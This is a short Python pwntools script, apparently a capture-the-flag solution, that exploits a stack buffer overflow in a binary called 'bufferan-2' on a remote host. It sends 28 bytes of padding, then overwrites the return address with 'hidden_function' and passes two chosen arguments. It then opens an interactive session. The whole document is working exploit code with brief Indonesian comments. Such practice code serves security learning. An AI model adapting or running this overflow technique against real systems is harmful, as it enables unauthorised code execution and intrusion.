from pwn import *

def exploit():
    binary = ELF("bufferan-2")
    p = remote("35.223.100.116", 9000)
    padding = 28
    flag = binary.symbols['hidden_function']
    arg1 = 0x14b4da55
    arg2 = 0xf00db4be

    payload = ""
    payload += 'A' * padding
    payload += p32(flag)
    payload += 'JUNK' #ngisi ret addr
    payload += p32(arg1)
    payload += p64(arg2) #karena long long size nya 8 byte

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
